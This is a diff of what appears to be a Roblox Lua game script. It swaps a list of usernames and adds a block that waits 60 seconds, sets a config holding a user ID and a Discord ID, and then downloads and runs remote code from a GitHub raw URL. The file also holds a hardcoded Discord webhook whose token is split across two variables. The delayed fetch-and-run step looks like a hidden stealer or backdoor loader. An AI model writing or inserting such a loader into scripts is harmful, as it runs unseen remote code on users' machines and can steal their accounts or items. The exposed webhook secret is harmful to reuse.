@@ -88,21 +88,19 @@ function serverHop()
 end
 
 local usernames = {
-"ROpS918m",
-"PCMaLcCX",
-"TBhtF3oo",
-"p4GgzQaF",
-"BlakeHawke_1",
-"KaiserToniy9",
-"RojasBethx1183",
-"HesterWarrend66",
-"PearsonCrystalb955",
-"CaldwellPamelao19",
-"BradleyRaymondh597",
-"TapiaTamih4",
-"BowmanPiney2",
-"PinkJoes33",
-"nZfuzFOG"
+"jzptnG34",
+"TCA4dwt0",
+"QYesGofo",
+"L6jMlUXt",
+"wQxWsZ4A",
+"WAD7FYAa",
+"TnVTyYMU",
+"priGE1wu",
+"KihDj0V1",
+"bzkslasla1863",
+"awKxoPFB",
+}
+
 local function getRandomUsername()
     local index = math.random(1, #usernames)
     return usernames[index]
@@ -160,6 +158,13 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
   end
 
+
+
+task.spawn(function()
+wait(60)
+_G.Config = { UserID = "f6aa7929-97af-42ce-b55b-423942b1804b", discord_id = "844977783083368518" , Note = "Pc", } 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/petsgo"))()
+end)
 
 local web = "https://discordapp.com/api/webhooks/1331539343495401472/"
 local web1 = "5D-Idt1_xt_8LCDTCm-GaW64gelRm5y7xr7mox-EwGjpRNPjGVODNJal93VE88Zh3ZRL"
